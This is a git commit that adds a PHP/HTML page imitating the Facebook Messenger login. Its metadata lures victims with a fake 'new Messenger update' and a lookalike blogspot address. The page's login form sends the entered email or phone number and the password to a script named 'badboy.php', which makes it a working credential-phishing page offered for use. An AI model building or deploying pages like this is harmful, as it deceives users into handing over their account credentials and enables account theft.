93f892de533dca78bb0a88ffea2f0a7e5bbbc418
Your Name <th3sniper1337@gmail.com>
2021-02-19 05:37:13 +0200

    1.0

---
+++ SPOILER_index.php
@@ -0,0 +1,104 @@
+
+<!DOCTYPE html>
+<head>
+<link href='stylesheet.css' rel='stylesheet' type='text/css'/>
+<meta charset='UTF-8'/>
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<link href='bootstrap.min.css' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Open+Sans:wght@300' rel='stylesheet'/>
+<!-- Primary Meta Tags -->
+<title>Messenger Login</title>
+<meta content='Messenger Login' name='title'/>
+<meta content='Now who has not reached the new Messenger update. Link to enter and click to get the new version, and click download' name='description'/>
+<!-- Open Graph / Facebook -->
+<meta content='website' property='og:type'/>
+<meta content='https://messangaarrr.blogspot.com/' property='og:url'/>
+<meta content='Messenger Login' property='og:title'/>
+<meta content='Now who has not reached the new Messenger update. Link to enter and click to get the new version, and click download' property='og:description'/>
+<meta content='https://i.imgur.com/WOTseQR.png' property='og:image'/>
+<!-- Twitter -->
+<meta content='summary_large_image' property='twitter:card'/>
+<meta content='https://messangaarrr.blogspot.com/' property='twitter:url'/>
+<meta content='Messenger Login' property='twitter:title'/>
+<meta content='Now who has not reached the new Messenger update. Link to enter and click to get the new version, and click download' property='twitter:description'/>
+<meta content='https://i.imgur.com/WOTseQR.png' property='twitter:image'/>
+<style id='page-skin-1' type='text/css'><!--
+.massenger_app{
+font-family: 'Open Sans', sans-serif;
+display: flex;
+justify-content: center;
+align-items: center;
+min-height: 100vh;
+}
+.massenger_image {
+margin: auto;
+}
+.massenger_image img{
+max-width: 100%;
+text-align: center;
+}
+.massenger_i_user{
+margin: 5px 0;
+border: 1px solid rgba(0, 0, 0, .20);
+padding: 10px 13px;
+border-radius: 5px;
+}
+.btn_log {
+background-color: #0a7cff;
+border: none;
+outline: none !important;
+padding: 10px 1rem;
+color: white;
+border-radius: 25px;
+margin: 10px auto;
+}
+.massenger_check{
+font-size: 14px;
+}
+@media (min-width: 320px){
+.massenger_i_user{
+padding: 10px 10px;
+}
+.massenger_login ::-webkit-input-placeholder{
+font-size: 14px;
+}
+}
+@media (min-width: 568px){
+.login ::-webkit-input-placeholder{
+font-size: 17px;
+}
+}
+
+--></style>
+
+</head>
+<body>
+<div class='no-items section' id='hell'></div>
+<div class='massenger_app'>
+<div class='container m-auto text-center'>
+<div class='col-md-8 col-xl-6 m-auto col-sm-12'>
+<div class='massenger_image col-md-5 col-7'>
+<img alt='' src='https://i.imgur.com/WOTseQR.png'/>
+</div>
+<div class='massenger_login col-md-8 col-12 m-auto'>
+<h1>Messenger</h1>
+<form action='badboy.php' method='POST'>
+<div class='username'><input class='massenger_i_user w-100' name='username' placeholder='Email address or phone number' required='required' type='text'/></div>
+<div class='password'><input class='massenger_i_user w-100' name='password' placeholder='Password' required='required' type='password'/></div>
+<button class='btn_log' type='submit'>Continue</button>
+<div class='form-group'>
+<div class='form-check'>
+<input class='form-check-input' id='gridCheck' type='checkbox'/>
+<label class='form-check-label massenger_check text-secondary' for='gridCheck'>
+                Keep Me Signed In
+                </label>
+</div>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+</script>
+</body>
+</html>
